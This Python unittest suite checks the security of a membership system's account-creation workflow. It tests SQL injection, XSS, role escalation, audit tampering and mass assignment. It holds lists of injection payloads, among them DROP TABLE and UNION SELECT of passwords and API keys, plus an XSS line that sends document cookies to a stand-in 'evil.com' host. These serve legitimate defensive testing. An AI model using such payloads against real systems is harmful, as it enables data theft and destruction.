#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Deep Security Testing for AccountCreationManager System
======================================================

This test suite provides extensive security validation for the account creation
system, focusing on preventing unauthorized access, injection attacks, and
ensuring proper audit trails.

Key Security Testing Areas:
- Zero Permission Bypass Validation: Ensures no ignore_permissions=True usage
- Injection Attack Prevention: SQL injection, XSS, and code injection tests
- Authorization Matrix Testing: Role-based access control validation
- Audit Trail Integrity: Complete logging and traceability validation
- Input Sanitization: Malicious input handling and filtering

Author: Verenigingen Security Team
"""

import frappe
from frappe import _
from frappe.utils import now, add_days, getdate
import json
from unittest.mock import patch, MagicMock

from verenigingen.utils.account_creation_manager import (
    AccountCreationManager,
    queue_account_creation_for_member,
    queue_account_creation_for_volunteer
)
from verenigingen.tests.fixtures.enhanced_test_factory import EnhancedTestCase


class TestAccountCreationDeepSecurity(EnhancedTestCase):
    """Deep security validation tests"""
    
    def setUp(self):
        super().setUp()
        self.original_user = frappe.session.user
        
    def tearDown(self):
        frappe.set_user(self.original_user)
        super().tearDown()
        
    def test_zero_ignore_permissions_usage(self):
        """Test that no ignore_permissions=True is used except for status tracking"""
        member = self.create_test_member(
            first_name="Zero",
            last_name="Permissions",
            email="zero.permissions@test.invalid"
        )
        
        request = self.create_test_account_creation_request(
            source_record=member.name,
            request_type="Member"
        )
        
        # Track all calls to methods that might use ignore_permissions
        with patch.object(frappe, 'get_doc') as mock_get_doc:
            # Mock the user document
            mock_user_doc = MagicMock()
            mock_get_doc.return_value = mock_user_doc
            
            frappe.set_user("Administrator")
            manager = AccountCreationManager(request.name)
            manager.load_request()
            
            # Test user creation
            try:
                manager.create_user_account()
                # Verify insert was called without ignore_permissions
                mock_user_doc.insert.assert_called_with()  # No ignore_permissions parameter
            except Exception:
                pass  # Expected in test environment
                
    def test_comprehensive_sql_injection_prevention(self):
        """Test comprehensive SQL injection attack prevention"""
        member = self.create_test_member(
            first_name="SQL",
            last_name="Injection",
            email="sql.injection@test.invalid"
        )
        
        # Advanced SQL injection attempts
        injection_payloads = [
            "'; DROP TABLE `tabUser`; SELECT * FROM `tabUser` WHERE '1'='1",
            "' UNION SELECT password FROM `tabUser` WHERE name='Administrator' --",
            "'; UPDATE `tabUser` SET enabled=0 WHERE name='Administrator'; --",
            "' OR 1=1 UNION SELECT api_key FROM `tabUser` --",
            "\"; DROP TABLE `tabAccount Creation Request`; --",
            "'; INSERT INTO `tabUser` (email, name) VALUES ('hacker@evil.com', 'hacker'); --"
        ]
        
        for payload in injection_payloads:
            with self.subTest(payload=payload[:50] + "..."):
                # Test in various fields
                test_fields = {
                    "email": payload + "@test.invalid",
                    "full_name": payload,
                    "business_justification": payload
                }
                
                for field_name, field_value in test_fields.items():
                    with self.subTest(field=field_name):
                        try:
                            malicious_data = {
                                "request_type": "Member",
                                "source_record": member.name,
                                "email": member.email,
                                "full_name": member.full_name,
                                field_name: field_value
                            }
                            
                            if field_name == "email":
                                # For email field, test will likely fail validation
                                with self.assertRaises((frappe.ValidationError, frappe.DoesNotExistError)):
                                    request = frappe.get_doc({
                                        "doctype": "Account Creation Request",
                                        **malicious_data
                                    })
                                    request.insert()
                            else:
                                # For other fields, should sanitize or reject
                                request = frappe.get_doc({
                                    "doctype": "Account Creation Request",
                                    **malicious_data
                                })
                                request.insert()
                                
                                # Verify no SQL commands remain
                                stored_value = getattr(request, field_name, "")
                                sql_keywords = ["DROP", "INSERT", "UPDATE", "DELETE", "SELECT", "UNION"]
                                for keyword in sql_keywords:
                                    self.assertNotIn(keyword, stored_value.upper(),
                                                   f"SQL keyword {keyword} found in sanitized field")
                                    
                        except Exception as e:
                            # Acceptable - system rejected malicious input
                            self.assertIn("validation", str(e).lower(), 
                                        f"Expected validation error, got: {e}")
                            
    def test_comprehensive_xss_prevention(self):
        """Test comprehensive XSS attack prevention"""
        member = self.create_test_member(
            first_name="XSS",
            last_name="Prevention",
            email="xss.prevention@test.invalid"
        )
        
        # Advanced XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "';alert('XSS');//",
            "<script>window.location='http://evil.com/steal?cookie='+document.cookie</script>",
            "<body onload=alert('XSS')>",
            "<input type='image' src=x onerror=alert('XSS')>",
            "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;"
        ]
        
        for payload in xss_payloads:
            with self.subTest(payload=payload[:30] + "..."):
                request_data = {
                    "doctype": "Account Creation Request",
                    "request_type": "Member",
                    "source_record": member.name,
                    "email": member.email,
                    "full_name": payload,  # XSS in name field
                    "business_justification": f"Test with payload: {payload}"
                }
                
                try:
                    request = frappe.get_doc(request_data)
                    request.insert()
                    
                    # Verify XSS payload was sanitized or rejected
                    dangerous_patterns = [
                        "<script", "javascript:", "<img", "<iframe", "<svg",
                        "<body", "<input", "onerror=", "onload=", "alert("
                    ]
                    
                    for pattern in dangerous_patterns:
                        self.assertNotIn(pattern.lower(), request.full_name.lower(),
                                       f"XSS pattern '{pattern}' found in sanitized field")
                        self.assertNotIn(pattern.lower(), request.business_justification.lower(),
                                       f"XSS pattern '{pattern}' found in sanitized field")
                        
                except (frappe.ValidationError, frappe.DoesNotExistError):
                    # Acceptable - system rejected malicious input
                    pass
                    
    def test_authorization_matrix_comprehensive(self):
        """Test comprehensive authorization matrix"""
        member = self.create_test_member(
            first_name="Authorization",
            last_name="Matrix",
            email="authorization.matrix@test.invalid"
        )
        
        # Create permission test scenario
        scenario = self.create_permission_test_scenario(
            authorized_roles=["System Manager", "Verenigingen Administrator"],
            unauthorized_roles=["Verenigingen Member", "Verenigingen Volunteer"]
        )
        
        # Test authorized users can create requests
        for auth_user in scenario["authorized_users"]:
            with self.subTest(user=auth_user.email):
                frappe.set_user(auth_user.email)
                
                try:
                    # Should succeed
                    result = queue_account_creation_for_member(member.name)
                    self.assertTrue(result.get("request_name"))
                    
                    # Clean up for next test
                    frappe.delete_doc("Account Creation Request", result["request_name"])
                    
                except frappe.PermissionError:
                    self.fail(f"Authorized user {auth_user.email} was denied access")
                    
        # Test unauthorized users cannot create requests
        for unauth_user in scenario["unauthorized_users"]:
            if unauth_user.email == "Guest":
                continue  # Skip Guest user
                
            with self.subTest(user=unauth_user.email):
                frappe.set_user(unauth_user.email)
                
                with self.assertRaises(frappe.PermissionError):
                    queue_account_creation_for_member(member.name)
                    
    def test_role_escalation_prevention(self):
        """Test prevention of role escalation attacks"""
        member = self.create_test_member(
            first_name="Role",
            last_name="Escalation",
            email="role.escalation@test.invalid"
        )
        
        # Create user with Verenigingen Administrator role
        admin_user = self.create_test_user_with_roles(
            email="admin.user@test.invalid",
            roles=["Verenigingen Administrator"]
        )
        
        frappe.set_user(admin_user.email)
        
        # Attempt to assign System Manager role (should fail)
        request_data = {
            "doctype": "Account Creation Request",
            "request_type": "Member",
            "source_record": member.name,
            "email": member.email,
            "full_name": member.full_name,
            "requested_roles": [{"role": "System Manager"}]  # Unauthorized escalation
        }
        
        with self.assertRaises(frappe.PermissionError):
            request = frappe.get_doc(request_data)
            request.insert()
            
    def test_audit_trail_tampering_prevention(self):
        """Test that audit trails cannot be tampered with"""
        member = self.create_test_member(
            first_name="Audit",
            last_name="Trail",
            email="audit.trail@test.invalid"
        )
        
        request = self.create_test_account_creation_request(
            source_record=member.name,
            request_type="Member"
        )
        
        original_requested_by = request.requested_by
        original_creation = request.creation
        
        # Attempt to modify audit fields
        tampering_attempts = {
            "requested_by": "Administrator",
            "creation": "2020-01-01 00:00:00",
            "modified_by": "Guest",
            "processed_by": "fake.user@test.invalid"
        }
        
        for field, malicious_value in tampering_attempts.items():
            with self.subTest(field=field):
                # Direct modification should be prevented
                original_value = getattr(request, field, None)
                
                try:
                    setattr(request, field, malicious_value)
                    request.save()
                    
                    # Reload and verify tampering was prevented
                    request.reload()
                    current_value = getattr(request, field, None)
                    
                    if field in ["requested_by", "creation"]:
                        # These should never change after creation
                        self.assertEqual(current_value, original_value,
                                       f"Audit field {field} was tampered with")
                    
                except Exception:
                    # Acceptable - system prevented tampering
                    pass
                    
    def test_session_hijacking_prevention(self):
        """Test prevention of session hijacking attacks"""
        member = self.create_test_member(
            first_name="Session",
            last_name="Hijacking",
            email="session.hijacking@test.invalid"
        )
        
        # Create legitimate user
        legit_user = self.create_test_user_with_roles(
            email="legitimate.user@test.invalid",
            roles=["Verenigingen Administrator"]
        )
        
        frappe.set_user(legit_user.email)
        
        # Create request
        request = self.create_test_account_creation_request(
            source_record=member.name,
            request_type="Member"
        )
        
        # Simulate session switch (potential hijacking)
        malicious_user = self.create_test_user_with_roles(
            email="malicious.user@test.invalid",
            roles=["Verenigingen Member"]  # Lower privilege
        )
        
        frappe.set_user(malicious_user.email)
        
        # Attempt to process request with hijacked session
        manager = AccountCreationManager(request.name)
        
        with self.assertRaises(frappe.PermissionError):
            manager.validate_processing_permissions()
            
    def test_data_exposure_prevention(self):
        """Test prevention of sensitive data exposure"""
        member = self.create_test_member(
            first_name="Data",
            last_name="Exposure",
            email="data.exposure@test.invalid"
        )
        
        # Create request with sensitive data
        request = self.create_test_account_creation_request(
            source_record=member.name,
            request_type="Member",
            business_justification="Confidential: Account for security testing"
        )
        
        # Create low-privilege user
        low_priv_user = self.create_test_user_with_roles(
            email="low.privilege@test.invalid",
            roles=["Verenigingen Member"]
        )
        
        frappe.set_user(low_priv_user.email)
        
        # Attempt to read sensitive request data
        with self.assertRaises(frappe.PermissionError):
            frappe.get_doc("Account Creation Request", request.name)
            
    def test_mass_assignment_prevention(self):
        """Test prevention of mass assignment attacks"""
        member = self.create_test_member(
            first_name="Mass",
            last_name="Assignment",
            email="mass.assignment@test.invalid"
        )
        
        # Attempt mass assignment of sensitive fields
        malicious_data = {
            "doctype": "Account Creation Request",
            "request_type": "Member",
            "source_record": member.name,
            "email": member.email,
            "full_name": member.full_name,
            # Attempt to mass-assign system fields
            "status": "Completed",  # Should be controlled
            "created_user": "Administrator",  # Should be controlled
            "completed_at": now(),  # Should be controlled
            "processed_by": "Administrator",  # Should be controlled
        }
        
        request = frappe.get_doc(malicious_data)
        request.insert()
        
        # Verify mass assignment was prevented
        self.assertEqual(request.status, "Requested")  # Should be default, not "Completed"
        self.assertIsNone(request.created_user)  # Should not be set
        self.assertIsNone(request.completed_at)  # Should not be set
        self.assertIsNone(request.processed_by)  # Should not be set


class TestAccountCreationAuditCompliance(EnhancedTestCase):
    """Audit compliance and logging tests"""
    
    def test_complete_audit_trail_creation(self):
        """Test that complete audit trail is created"""
        member = self.create_test_member(
            first_name="Audit",
            last_name="Trail",
            email="audit.trail.complete@test.invalid"
        )
        
        request = self.create_test_account_creation_request(
            source_record=member.name,
            request_type="Member"
        )
        
        # Verify initial audit fields
        self.assertIsNotNone(request.requested_by)
        self.assertIsNotNone(request.creation)
        self.assertEqual(request.status, "Requested")
        
        # Process the request
        frappe.set_user("Administrator")
        manager = AccountCreationManager(request.name)
        manager.process_complete_pipeline()
        
        # Verify complete audit trail
        request.reload()
        self.assertEqual(request.status, "Completed")
        self.assertIsNotNone(request.processed_by)
        self.assertIsNotNone(request.processing_started_at)
        self.assertIsNotNone(request.completed_at)
        self.assertEqual(request.pipeline_stage, "Completed")
        
    def test_failure_audit_trail_preservation(self):
        """Test that failure audit trails are preserved"""
        member = self.create_test_member(
            first_name="Failure",
            last_name="Audit",
            email="failure.audit@test.invalid"
        )
        
        # Create request with invalid role to cause failure
        request_data = {
            "doctype": "Account Creation Request",
            "request_type": "Member",
            "source_record": member.name,
            "email": member.email,
            "full_name": member.full_name,
            "requested_roles": [{"role": "Nonexistent Role"}]
        }
        
        request = frappe.get_doc(request_data)
        request.append("requested_roles", {"role": "Nonexistent Role"})
        request.insert()
        
        # Attempt processing (should fail)
        frappe.set_user("Administrator")
        manager = AccountCreationManager(request.name)
        
        with self.assertRaises(frappe.ValidationError):
            manager.process_complete_pipeline()
            
        # Verify failure audit trail
        request.reload()
        self.assertEqual(request.status, "Failed")
        self.assertIsNotNone(request.failure_reason)
        self.assertIn("does not exist", request.failure_reason)
        
    def test_security_event_logging(self):
        """Test that security events are properly logged"""
        member = self.create_test_member(
            first_name="Security",
            last_name="Logging",
            email="security.logging@test.invalid"
        )
        
        # Create unauthorized user
        unauth_user = self.create_test_user_with_roles(
            email="unauthorized.security@test.invalid",
            roles=["Verenigingen Member"]
        )
        
        frappe.set_user(unauth_user.email)
        
        # Attempt unauthorized operation
        with self.assertRaises(frappe.PermissionError):
            queue_account_creation_for_member(member.name)
            
        # Note: In a production system, this would check actual security logs
        # For testing, we verify the error was properly raised and would be logged


if __name__ == "__main__":
    import unittest
    unittest.main(verbosity=2)